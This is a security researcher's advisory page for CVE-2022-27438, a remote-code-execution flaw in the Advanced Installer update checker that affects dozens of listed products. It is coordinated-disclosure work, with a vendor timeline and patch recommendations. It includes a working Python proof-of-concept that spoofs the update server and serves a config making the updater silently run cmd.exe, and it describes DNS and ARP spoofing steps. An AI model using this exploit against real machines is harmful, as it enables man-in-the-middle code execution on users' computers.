<!doctype html><html lang=en dir=auto>
<head><meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge">
<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
<meta name=robots content="index, follow">
<title>CVE-2022-27438 | Gar Reversing</title>
<meta name=keywords content="cwe_494,coordinated_release">
<meta name=description content="Caphyon Ltd Advanced Installer 19.3 &ldquo;CustomDetection&rdquo; Update Check Remote Code Execution Vulnerability (PDF)">
<meta name=author content="Gary">
<link rel=canonical href=https://gar-re.github.io/posts/cve-2022-27438/>
<meta name=google-site-verification content="XYZabc">
<meta name=yandex-verification content="XYZabc">
<meta name=msvalidate.01 content="XYZabc">
<link crossorigin=anonymous href=/assets/css/stylesheet.319f7209271a6127ecb9f000084aa4ce7f5f4394f5ef702b9cbb0f5bdd4523de.css integrity="sha256-MZ9yCScaYSfsufAACEqkzn9fQ5T173ArnLsPW91FI94=" rel="preload stylesheet" as=style>
<script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://gar-re.github.io/favicon.ico>
<link rel=icon type=image/png sizes=16x16 href=https://gar-re.github.io/favicon-16x16.png>
<link rel=icon type=image/png sizes=32x32 href=https://gar-re.github.io/favicon-32x32.png>
<link rel=apple-touch-icon href=https://gar-re.github.io/apple-touch-icon.png>
<link rel=mask-icon href=https://gar-re.github.io/safari-pinned-tab.svg>
<meta name=theme-color content="#2e2e33">
<meta name=msapplication-TileColor content="#2e2e33">
<noscript>
<style>#theme-toggle,.top-link{display:none}</style>
</noscript><meta property="og:title" content="CVE-2022-27438">
<meta property="og:description" content="Caphyon Ltd Advanced Installer 19.3 &ldquo;CustomDetection&rdquo; Update Check Remote Code Execution Vulnerability (PDF)">
<meta property="og:type" content="article">
<meta property="og:url" content="https://gar-re.github.io/posts/cve-2022-27438/">
<meta property="og:image" content="https://gar-re.github.io/posts/cve-2022-27438/cover.png"><meta property="article:section" content="posts">
<meta property="article:published_time" content="2022-06-01T00:00:00+00:00">
<meta property="article:modified_time" content="2022-06-01T00:00:00+00:00"><meta property="og:site_name" content="Gar Reversing">
<meta name=twitter:card content="summary_large_image">
<meta name=twitter:image content="https://gar-re.github.io/posts/cve-2022-27438/cover.png">
<meta name=twitter:title content="CVE-2022-27438">
<meta name=twitter:description content="Caphyon Ltd Advanced Installer 19.3 &ldquo;CustomDetection&rdquo; Update Check Remote Code Execution Vulnerability (PDF)">
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://gar-re.github.io/posts/"},{"@type":"ListItem","position":2,"name":"CVE-2022-27438","item":"https://gar-re.github.io/posts/cve-2022-27438/"}]}</script>
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"CVE-2022-27438","name":"CVE-2022-27438","description":"Caphyon Ltd Advanced Installer 19.3 \u0026ldquo;CustomDetection\u0026rdquo; Update Check Remote Code Execution Vulnerability (PDF)\n","keywords":["cwe_494","coordinated_release"],"articleBody":"Caphyon Ltd Advanced Installer 19.3 “CustomDetection” Update Check Remote Code Execution Vulnerability (PDF)\nAdvisory Information  Title: Caphyon Ltd Advanced Installer 19.3 “CustomDetection” Update Check Remote Code Execution Vulnerability Vendor Advisory: Important Security Updates for the Advanced Installer Auto Updater Release mode: Coordinated Release  Vulnerability Information  Class: Download of Code Without Integrity Check [CWE-494] Affected Products: Advanced Installer 19.3 and earlier, and all products that use the updater from Caphyon Ltd Advanced Installer, Advanced Updater. Remotely Exploitable: Yes Locally Exploitable: Yes Severity: Critical - 9.6 (CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H) CVE Identifier: CVE-2022-27438 Products tested to be vulnerable:  3CX Ltd Call Flow Designer 18.2.13 (TLS) 3CX Ltd CRM Template Generator 2.1.23 (TLS) BoomTV Inc Streamer Portal 2.2.1 (TLS) Caphyon Ltd Advanced Installer 19.3 (TLS) Code Sector Direct Folders 4.0 (TLS) Code Sector TeraCopy 3.8.5 (TLS) Emurasoft Inc EmEditor 21.3.0 ESI Technology Ltd ESI-USB Software 2.5.4.0 Flamory Flamory 4.2.19.0 (TLS/elevated) Freesnippingtool.com Free Snipping Tool 5.6.0.0 (TLS) FxSound LLC FxSound 1.1.12.0 (TLS) Gainedge Software Better Explorer 2020.3.15.1304 (TLS) Gamecaster Pte Ltd Gamecaster 4.0.2109.2802 (TLS/elevated) GuzoGo Travel PLC GuzoGo: Compare and Book Flight Tickets 1.0.5.0 Honeygain Honeygain for Windows 0.10.7.0 (TLS) JKI Soft VI Package Manager 21.1.2754 JP Software Inc Take Command 28.2.18 (TLS) KRyLack Software KRyLack Archive Password Recovery 3.70.69 KRyLack Software Asterisks Password Decryptor 3.31.107 KRyLack Software Burning Suite 1.20.05 KRyLack Software RAR Password Recovery 3.70.69 KRyLack Software Volume Serial Number Editor 2.02.34 KRyLack Software ZIP Password Recovery 3.70.69 Mailbird Inc Mailbird 2.9.50.0 (TLS) Moon Software Password Agent 20.10.1 Nefarius Software Solutions e.U. ScpToolkit 1.6.238.16010 (TLS) Nefarius Software Solutions e.U. ViGEm Bus Driver 1.16.116 (TLS) Parade Technologies Ltd USB 3.0 to VGA/DVI/HDMI Driver 2.1.36287.0 Plagiarism Checker X 8.0.6 (TLS) Prusa Research a.s. Slicer 2.4.2 (TLS) RealDefense LLC MyCleanID 4.1.4 (elevated) RealDefense LLC MyCleanPC 4.0.2 (TLS/elevated) RealDefense LLC MyPassLock 1.9.6 Rovio Entertainment Ltd Angry Birds Space 1.4.1 Rovio Entertainment Ltd Bad Piggies 1.3.0 RST Instruments Ltd DT Logger Host Software 1.19.4.0 RST Instruments Ltd Inclinalysis Digital Inclinometer Software 2.48.9 RST Instruments Ltd IPI Utility Software 1.05.0 RST Instruments Ltd Readout Host Software 1.4.0.2 RST Instruments Ltd RSTAR RTU Host Software 1.33.0 RST Instruments Ltd Tilt Meter Host Software 1.20.1 RST Instruments Ltd VW0420 Vibrating Wire Isolated Analog Interface Software 1.33.0 SplitmediaLabs Ltd XSplit Express Video Editor 3.0.2001.801 (TLS) UrbanVPN VPN for Windows 2.2.5 (TLS) Virtual Desktop Inc Virtual Desktop Streamer 1.20.16 (TLS) VpnHood VpnHood Client for Windows 2.4.299 (TLS)    CVSSs Affected products perform their update check either unauthenticated through HTTP or through TLS/HTTPS. Moreover, some updaters run as an administrative user at high integrity. As a result, depending on the affected product the CVSS differs.\nUnauthenticated/HTTP, elevated: 9.6 (CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)\nUnauthenticated/HTTP: 8.8 (CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)\nTLS, elevated: 8.8 (CVSS:3.1/AV:A/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H)\nTLS: 8.0 (CVSS:3.1/AV:A/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H)\nHigh-level overview This vulnerability allows remote attackers to execute arbitrary code on the affected installations of Caphyon Ltd Advanced Installer and all products that use the updater from Caphyon Ltd Advanced Installer, Advanced Updater. A man-in-the-middle position is required to exploit this vulnerability. User interaction is required in that the Windows untrusted certificate security alert has to be proceeded (only for updaters using TLS).\nThe specific flaw exists in the updater of Advanced Installer, which insufficiently authenticates its update server. An attacker can spoof these update servers and leverage this vulnerability to execute code in the context of the current user.\nRoot Cause Analysis The vulnerability is caused by the updater of Advanced Installer: Advanced Updater, part of Caphyon Ltd Advanced Installer. From the Advanced Installer User Guide we find that the updater allows for specifying an alternate update check using the CustomDetection and CustomDetectionParameter in the requested update configuration.\nBy default, the update check is triggered automatically after starting the application and with a 2 day interval, and manually through the application menu or executing the update binary.\nIn the case of Advanced Installer 19.3, the update requests https://www.advancedinstaller.com/downloads/updates.ini, which can contain a specified CustomDetection (any binary on the local system) and CustomDetectionParameter (its parameters), which the application executes in the context of the current user.\nProof of Concept The below script is used as a proof of concept. For affected products that request an update over HTTP, skip the ssl.wrap_socket call and change the port to 80.\n#!/usr/bin/env python3 # Proof of concept script for Caphyon Ltd Advanced Installer \"CustomDetection\" Update Check Remote Code Execution Vulnerability # See report for details. # # Generate self-signed certificate using e.g. #  openssl req -new -x509 -keyout www.advancedinstaller.com.pem -out www.advancedinstaller.com.pem -days 365 -nodes -subj \"/CN=www.advancedinstaller.com\" # # Author: Gerr.re from http.server import BaseHTTPRequestHandler, HTTPServer import ssl # CustomDetection with CustomDetectionParams is executed after receiving the response. # Note that we set exitcode != 0 s.t. the updater thinks there is no new update (so no visual feedback on exploit). updateconfig = b''';aiu; [Update] Name = Caphyon Ltd Advanced Updater CustomDetection Update Check Remote Code Execution Vulnerability URL = http://example.com/doesnotmatter Size = 1024 CustomDetection = c:\\windows\\system32\\cmd.exe CustomDetectionParams = /c \"c:\\windows\\system32\\calc.exe \u0026\u0026 exit 1\" ''' class HTTPHandler(BaseHTTPRequestHandler): def do_GET(self): if \"updates.ini\" in self.path: self.send_response(200) self.end_headers() self.wfile.write(updateconfig) else: self.send_response(404) self.end_headers() if __name__ == \"__main__\": print(\"Running Server\") try: httpd = HTTPServer((\"0.0.0.0\", 443), HTTPHandler) httpd.socket = ssl.wrap_socket(httpd.socket, server_side=True, certfile='www.advancedinstaller.com.pem', ssl_version=ssl.PROTOCOL_TLS) httpd.serve_forever() except KeyboardInterrupt: httpd.server_close() Testsetup This proof of concept was tested on target Windows 10 21H2 with Caphyon Ltd Advanced Installer 19.3 installed, and attacker Ubuntu 20.04.3 LTS.\nSteps to reproduce For other affected products, you have to change the update server and update configuration filename. These can often be found in the updater .ini in the application installation directory.\n Install Advanced Installer 19.3; Set spoof www.advancedinstaller.com to our attacker ip;  For the proof of concept it is easiest to edit c:\\windows\\system32\\drivers\\etc\\hosts on the target.  Attackers may e.g. use:  poorly configured routers/switches/DNS DNS spoof / cache poisoning ARP spoof / cache poisoning       Generate self-signed certificates;  e.g. using openssl req -new -x509 -keyout www.advancedinstaller.com.pem -out www.advancedinstaller.com.pem -days 365 -nodes -subj \"/CN=www.advancedinstaller.com\"   Run the proof of concept script on the attacker; Start Advanced Installer to trigger update automatically, or  wait for 2 days to trigger update automatically, or trigger update manually through the application menu/settings, or trigger update manually by starting the update application at C:\\Program Files (x86)\\Caphyon\\Advanced Installer 19.3\\bin\\x86\\updater.exe;   Proceed with the Windows untrusted certificate security alert (if applicable).  As a result, the binary specified in CustomDetection with parameters specified in CustomDetectionParameters is executed in the context of the current user.\nCustomDetection with parameters specified in CustomDetectionParameters is executed in the context of the current user\" / Recommendations The vulnerability presents itself because there is insufficient authentication from the update server. This vulnerability is fixed in Advanced Installer 19.4.\nWe recommend vendors of affected products to build the product using Advanced Installer 19.4 and release this update as soon as possible. Mention the update and CVE-2022-27438 in the changelog.\nWe recommend users of affected products to update to a fixed version as soon as possible. Refer to the website of the affected product for updates and changelogs (look for “CVE-2022-27438 fix”).\nReport Timeline  11-02-2022: Initial contact with the vendor via support@advancedinstaller.com. 21-02-2022: Vendor releases version 19.2 which is still vulnerable. 04-03-2022: Gerr.re sent reminder to support@advancedinstaller.com after no response. 18-03-2022: Gerr.re sent a request to Mitre for a CVE ID. 18-03-2022: Gerr.re sent final reminder to support@advancedinstaller.com after no response. 21-03-2022: Vendor releases version 19.3 which is still vulnerable. 21-03-2022: Vendor replies, requesting technical details. 21-03-2022: A draft report with technical details and a proof of concept application was sent to the vendor. 22-03-2022: Vendor acknowledges reception of technical details. 23-03-2022: Vendor confirms the vulnerability. 24-03-2022: Vendor shares release candidate 19.4 and requests a retest on the fixes. 25-03-2022: Gerr.re confirms the fixes and sends further security recommendations. 29-03-2022: Vendor sends questions regarding security recommendations. 06-04-2022: Gerr.re sends additional information to answer the questions. 26-04-2022: Vendor releases version 19.4 that includes the fixes. 28-04-2022: Mitre assigns CVE-2022-27438. 01-06-2022: Coordinated release. 12-06-2022: Gerr.re sends remarks regarding false assumptions made in the vendor advisory. 20-06-2022: Updated public advisory with link to vendor advisory.  Disclaimer The contents of this advisory are copyright © 2022 Gerr.re, and are licensed under a Creative Commons Attribution-NoDerivatives 4.0 International (CC BY-ND 4.0)\n","wordCount":"1325","inLanguage":"en","image":"https://gar-re.github.io/posts/cve-2022-27438/cover.png","datePublished":"2022-06-01T00:00:00Z","dateModified":"2022-06-01T00:00:00Z","author":{"@type":"Person","name":"Gary"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://gar-re.github.io/posts/cve-2022-27438/"},"publisher":{"@type":"Organization","name":"Gar Reversing","logo":{"@type":"ImageObject","url":"https://gar-re.github.io/favicon.ico"}}}</script>
</head>
<body class=dark id=top>
<script>localStorage.getItem("pref-theme")==="light"&&document.body.classList.remove('dark')</script>
<header class=header>
<nav class=nav>
<div class=logo>
<a href=https://gar-re.github.io/ accesskey=h title="Gar Reversing (Alt + H)">
<img src=https://gar-re.github.io/gar-re_logo.png alt aria-label=logo height=35>Gar Reversing</a>
<div class=logo-switches>
<button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
</button>
</div>
</div>
<ul id=menu>
<li>
<a href=https://gar-re.github.io/contact/ title=Contact>
<span>Contact</span>
</a>
</li>
<li>
<a href=https://gar-re.github.io/disclosure-policy/ title="Disclosure Policy">
<span>Disclosure Policy</span>
</a>
</li>
<li>
<a href=https://gar-re.github.io/archives/ title=Archive>
<span>Archive</span>
</a>
</li>
<li>
<a href=https://gar-re.github.io/tags/ title=Tags>
<span>Tags</span>
</a>
</li>
</ul>
</nav>
</header>
<main class=main>
<article class=post-single>
<header class=post-header>
<h1 class=post-title>
CVE-2022-27438
</h1>
<div class=post-meta><span title="2022-06-01 00:00:00 +0000 UTC">June 1, 2022</span>&nbsp;·&nbsp;7 min&nbsp;·&nbsp;Gary
</div>
</header>
<figure class=entry-cover>
<img loading=lazy srcset="https://gar-re.github.io/posts/cve-2022-27438/cover_hu6e5b1b8f4cc15ce0b7d8110715ced4a6_101323_360x0_resize_box_3.png 360w ,https://gar-re.github.io/posts/cve-2022-27438/cover_hu6e5b1b8f4cc15ce0b7d8110715ced4a6_101323_480x0_resize_box_3.png 480w ,https://gar-re.github.io/posts/cve-2022-27438/cover_hu6e5b1b8f4cc15ce0b7d8110715ced4a6_101323_720x0_resize_box_3.png 720w ,https://gar-re.github.io/posts/cve-2022-27438/cover_hu6e5b1b8f4cc15ce0b7d8110715ced4a6_101323_1080x0_resize_box_3.png 1080w ,https://gar-re.github.io/posts/cve-2022-27438/cover_hu6e5b1b8f4cc15ce0b7d8110715ced4a6_101323_1500x0_resize_box_3.png 1500w ,https://gar-re.github.io/posts/cve-2022-27438/cover.png 2680w" sizes="(min-width: 768px) 720px, 100vw" src=https://gar-re.github.io/posts/cve-2022-27438/cover.png alt width=2680 height=560>
</figure><div class=toc>
<details>
<summary accesskey=c title="(Alt + C)">
<span class=details>Table of Contents</span>
</summary>
<div class=inner><ul>
<li>
<a href=#advisory-information aria-label="Advisory Information">Advisory Information</a></li>
<li>
<a href=#vulnerability-information aria-label="Vulnerability Information">Vulnerability Information</a><ul>
<li>
<a href=#cvsss aria-label=CVSSs>CVSSs</a></li></ul>
</li>
<li>
<a href=#high-level-overview aria-label="High-level overview">High-level overview</a></li>
<li>
<a href=#root-cause-analysis aria-label="Root Cause Analysis">Root Cause Analysis</a></li>
<li>
<a href=#proof-of-concept aria-label="Proof of Concept">Proof of Concept</a><ul>
<li>
<a href=#testsetup aria-label=Testsetup>Testsetup</a></li>
<li>
<a href=#steps-to-reproduce aria-label="Steps to reproduce">Steps to reproduce</a></li></ul>
</li>
<li>
<a href=#recommendations aria-label=Recommendations>Recommendations</a></li>
<li>
<a href=#report-timeline aria-label="Report Timeline">Report Timeline</a></li>
<li>
<a href=#disclaimer aria-label=Disclaimer>Disclaimer</a>
</li>
</ul>
</div>
</details>
</div>
<div class=post-content><p>Caphyon Ltd Advanced Installer 19.3 &ldquo;CustomDetection&rdquo; Update Check Remote Code Execution Vulnerability (<a href=https://github.com/gar-re/cve-2022-27438/blob/main/cve-2022-27438_public-advisory.pdf>PDF</a>)</p>
<h1 id=advisory-information>Advisory Information<a hidden class=anchor aria-hidden=true href=#advisory-information>#</a></h1>
<ul>
<li><strong>Title:</strong> Caphyon Ltd Advanced Installer 19.3 &ldquo;CustomDetection&rdquo; Update Check Remote Code Execution Vulnerability</li>
<li><strong>Vendor Advisory:</strong> <a href=https://www.advancedinstaller.com/security-updates-auto-updater.html><em>Important Security Updates for the Advanced Installer Auto Updater</em></a></li>
<li><strong>Release mode:</strong> Coordinated Release</li>
</ul>
<h1 id=vulnerability-information>Vulnerability Information<a hidden class=anchor aria-hidden=true href=#vulnerability-information>#</a></h1>
<ul>
<li><strong>Class:</strong> Download of Code Without Integrity Check <a href=https://cwe.mitre.org/data/definitions/494.html>[CWE-494]</a></li>
<li><strong>Affected Products:</strong> <a href=https://www.advancedinstaller.com>Advanced Installer</a> 19.3 and earlier, and all products that use the updater from Caphyon Ltd Advanced Installer, Advanced Updater.</li>
<li><strong>Remotely Exploitable:</strong> Yes</li>
<li><strong>Locally Exploitable:</strong> Yes</li>
<li><strong>Severity:</strong> Critical - <a href="https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:A/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H&version=3.1">9.6 (CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)</a></li>
<li><strong>CVE Identifier:</strong> <a href=https://nvd.nist.gov/vuln/detail/CVE-2022-27438>CVE-2022-27438</a></li>
<li><strong>Products tested to be vulnerable:</strong>
<ul>
<li>3CX Ltd Call Flow Designer 18.2.13 (TLS)</li>
<li>3CX Ltd CRM Template Generator 2.1.23 (TLS)</li>
<li>BoomTV Inc Streamer Portal 2.2.1 (TLS)</li>
<li>Caphyon Ltd Advanced Installer 19.3 (TLS)</li>
<li>Code Sector Direct Folders 4.0 (TLS)</li>
<li>Code Sector TeraCopy 3.8.5 (TLS)</li>
<li>Emurasoft Inc EmEditor 21.3.0</li>
<li>ESI Technology Ltd ESI-USB Software 2.5.4.0</li>
<li>Flamory Flamory 4.2.19.0 (TLS/elevated)</li>
<li>Freesnippingtool.com Free Snipping Tool 5.6.0.0 (TLS)</li>
<li>FxSound LLC FxSound 1.1.12.0 (TLS)</li>
<li>Gainedge Software Better Explorer 2020.3.15.1304 (TLS)</li>
<li>Gamecaster Pte Ltd Gamecaster 4.0.2109.2802 (TLS/elevated)</li>
<li>GuzoGo Travel PLC GuzoGo: Compare and Book Flight Tickets 1.0.5.0</li>
<li>Honeygain Honeygain for Windows 0.10.7.0 (TLS)</li>
<li>JKI Soft VI Package Manager 21.1.2754</li>
<li>JP Software Inc Take Command 28.2.18 (TLS)</li>
<li>KRyLack Software KRyLack Archive Password Recovery 3.70.69</li>
<li>KRyLack Software Asterisks Password Decryptor 3.31.107</li>
<li>KRyLack Software Burning Suite 1.20.05</li>
<li>KRyLack Software RAR Password Recovery 3.70.69</li>
<li>KRyLack Software Volume Serial Number Editor 2.02.34</li>
<li>KRyLack Software ZIP Password Recovery 3.70.69</li>
<li>Mailbird Inc Mailbird 2.9.50.0 (TLS)</li>
<li>Moon Software Password Agent 20.10.1</li>
<li>Nefarius Software Solutions e.U. ScpToolkit 1.6.238.16010 (TLS)</li>
<li>Nefarius Software Solutions e.U. ViGEm Bus Driver 1.16.116 (TLS)</li>
<li>Parade Technologies Ltd USB 3.0 to VGA/DVI/HDMI Driver 2.1.36287.0</li>
<li>Plagiarism Checker X 8.0.6 (TLS)</li>
<li>Prusa Research a.s. Slicer 2.4.2 (TLS)</li>
<li>RealDefense LLC MyCleanID 4.1.4 (elevated)</li>
<li>RealDefense LLC MyCleanPC 4.0.2 (TLS/elevated)</li>
<li>RealDefense LLC MyPassLock 1.9.6</li>
<li>Rovio Entertainment Ltd Angry Birds Space 1.4.1</li>
<li>Rovio Entertainment Ltd Bad Piggies 1.3.0</li>
<li>RST Instruments Ltd DT Logger Host Software 1.19.4.0</li>
<li>RST Instruments Ltd Inclinalysis Digital Inclinometer Software 2.48.9</li>
<li>RST Instruments Ltd IPI Utility Software 1.05.0</li>
<li>RST Instruments Ltd Readout Host Software 1.4.0.2</li>
<li>RST Instruments Ltd RSTAR RTU Host Software 1.33.0</li>
<li>RST Instruments Ltd Tilt Meter Host Software 1.20.1</li>
<li>RST Instruments Ltd VW0420 Vibrating Wire Isolated Analog Interface Software 1.33.0</li>
<li>SplitmediaLabs Ltd XSplit Express Video Editor 3.0.2001.801 (TLS)</li>
<li>UrbanVPN VPN for Windows 2.2.5 (TLS)</li>
<li>Virtual Desktop Inc Virtual Desktop Streamer 1.20.16 (TLS)</li>
<li>VpnHood VpnHood Client for Windows 2.4.299 (TLS)</li>
</ul>
</li>
</ul>
<h2 id=cvsss>CVSSs<a hidden class=anchor aria-hidden=true href=#cvsss>#</a></h2>
<p>Affected products perform their update check either unauthenticated through HTTP or through TLS/HTTPS. Moreover, some updaters run as an administrative user at high integrity. As a result, depending on the affected product the CVSS differs.</p>
<p>Unauthenticated/HTTP, elevated: <a href="https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:A/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H&version=3.1">9.6 (CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)</a></p>
<p>Unauthenticated/HTTP: <a href="https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H&version=3.1">8.8 (CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)</a></p>
<p>TLS, elevated: <a href="https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:A/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H&version=3.1">8.8 (CVSS:3.1/AV:A/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H)</a></p>
<p>TLS: <a href="https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:A/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H&version=3.1">8.0 (CVSS:3.1/AV:A/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H)</a></p>
<h1 id=high-level-overview>High-level overview<a hidden class=anchor aria-hidden=true href=#high-level-overview>#</a></h1>
<p>This vulnerability allows remote attackers to execute arbitrary code on the affected installations of Caphyon Ltd Advanced Installer and all products that use the updater from Caphyon Ltd Advanced Installer, Advanced Updater.
A man-in-the-middle position is required to exploit this vulnerability.
User interaction is required in that the Windows untrusted certificate security alert has to be proceeded (only for updaters using TLS).</p>
<p>The specific flaw exists in the updater of Advanced Installer, which insufficiently authenticates its update server.
An attacker can spoof these update servers and leverage this vulnerability to execute code in the context of the current user.</p>
<h1 id=root-cause-analysis>Root Cause Analysis<a hidden class=anchor aria-hidden=true href=#root-cause-analysis>#</a></h1>
<p>The vulnerability is caused by the updater of Advanced Installer: Advanced Updater, part of Caphyon Ltd Advanced Installer.
From the Advanced Installer <a href=https://www.advancedinstaller.com/user-guide/updates-configuration.html>User Guide</a> we find that the updater allows for specifying an alternate update check using the <code>CustomDetection</code> and <code>CustomDetectionParameter</code> in the requested update configuration.</p>
<p>By default, the update check is triggered automatically after starting the application and with a 2 day interval, and manually through the application menu or executing the update binary.</p>
<p>In the case of Advanced Installer 19.3, the update requests <code>https://www.advancedinstaller.com/downloads/updates.ini</code>, which can contain a specified <code>CustomDetection</code> (any binary on the local system) and <code>CustomDetectionParameter</code> (its parameters), which the application executes in the context of the current user.</p>
<h1 id=proof-of-concept>Proof of Concept<a hidden class=anchor aria-hidden=true href=#proof-of-concept>#</a></h1>
<p>The below script is used as a proof of concept. For affected products that request an update over HTTP, skip the <code>ssl.wrap_socket</code> call and change the port to 80.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#!/usr/bin/env python3</span>
<span style=color:#75715e># Proof of concept script for Caphyon Ltd Advanced Installer &#34;CustomDetection&#34; Update Check Remote Code Execution Vulnerability</span>
<span style=color:#75715e># See report for details.</span>
<span style=color:#75715e>#</span>
<span style=color:#75715e># Generate self-signed certificate using e.g.</span>
<span style=color:#75715e># &gt; openssl req -new -x509 -keyout www.advancedinstaller.com.pem -out www.advancedinstaller.com.pem -days 365 -nodes -subj &#34;/CN=www.advancedinstaller.com&#34;</span>
<span style=color:#75715e>#</span>
<span style=color:#75715e># Author: Gerr.re</span>
<span style=color:#f92672>from</span> http.server <span style=color:#f92672>import</span> BaseHTTPRequestHandler, HTTPServer
<span style=color:#f92672>import</span> ssl

<span style=color:#75715e># CustomDetection with CustomDetectionParams is executed after receiving the response.</span>
<span style=color:#75715e># Note that we set exitcode != 0 s.t. the updater thinks there is no new update (so no visual feedback on exploit).</span>
updateconfig <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;&#39;&#39;;aiu;
</span><span style=color:#e6db74>
</span><span style=color:#e6db74>[Update]
</span><span style=color:#e6db74>Name = Caphyon Ltd Advanced Updater CustomDetection Update Check Remote Code Execution Vulnerability
</span><span style=color:#e6db74>URL = http://example.com/doesnotmatter
</span><span style=color:#e6db74>Size = 1024
</span><span style=color:#e6db74>CustomDetection = c:\windows\system32\cmd.exe
</span><span style=color:#e6db74>CustomDetectionParams = /c &#34;c:\windows\system32\calc.exe &amp;&amp; exit 1&#34;
</span><span style=color:#e6db74>&#39;&#39;&#39;</span>

<span style=color:#66d9ef>class</span> <span style=color:#a6e22e>HTTPHandler</span>(BaseHTTPRequestHandler):
    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>do_GET</span>(self):
        <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#34;updates.ini&#34;</span> <span style=color:#f92672>in</span> self<span style=color:#f92672>.</span>path:
            self<span style=color:#f92672>.</span>send_response(<span style=color:#ae81ff>200</span>)
            self<span style=color:#f92672>.</span>end_headers()
            self<span style=color:#f92672>.</span>wfile<span style=color:#f92672>.</span>write(updateconfig)
        <span style=color:#66d9ef>else</span>:
            self<span style=color:#f92672>.</span>send_response(<span style=color:#ae81ff>404</span>)
            self<span style=color:#f92672>.</span>end_headers()

<span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
    print(<span style=color:#e6db74>&#34;Running Server&#34;</span>)

    <span style=color:#66d9ef>try</span>:
        httpd <span style=color:#f92672>=</span> HTTPServer((<span style=color:#e6db74>&#34;0.0.0.0&#34;</span>, <span style=color:#ae81ff>443</span>), HTTPHandler)
        httpd<span style=color:#f92672>.</span>socket <span style=color:#f92672>=</span> ssl<span style=color:#f92672>.</span>wrap_socket(httpd<span style=color:#f92672>.</span>socket,
                                server_side<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>,
                                certfile<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;www.advancedinstaller.com.pem&#39;</span>,
                                ssl_version<span style=color:#f92672>=</span>ssl<span style=color:#f92672>.</span>PROTOCOL_TLS)
        httpd<span style=color:#f92672>.</span>serve_forever()
    <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>KeyboardInterrupt</span>:
        httpd<span style=color:#f92672>.</span>server_close()
</code></pre></div><h2 id=testsetup>Testsetup<a hidden class=anchor aria-hidden=true href=#testsetup>#</a></h2>
<p>This proof of concept was tested on target Windows 10 21H2 with Caphyon Ltd Advanced Installer 19.3 installed, and attacker Ubuntu 20.04.3 LTS.</p>
<h2 id=steps-to-reproduce>Steps to reproduce<a hidden class=anchor aria-hidden=true href=#steps-to-reproduce>#</a></h2>
<p>For other affected products, you have to change the update server and update configuration filename. These can often be found in the updater <code>.ini</code> in the application installation directory.</p>
<ol>
<li>Install <a href=https://www.advancedinstaller.com/downloads/advinst.msi>Advanced Installer 19.3</a>;</li>
<li>Set spoof <code>www.advancedinstaller.com</code> to our attacker ip;
<ul>
<li>For the proof of concept it is easiest to edit <code>c:\windows\system32\drivers\etc\hosts</code> on the target.
<ul>
<li>Attackers may e.g. use:
<ul>
<li>poorly configured routers/switches/DNS</li>
<li>DNS spoof / cache poisoning</li>
<li>ARP spoof / cache poisoning</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Generate self-signed certificates;
<ul>
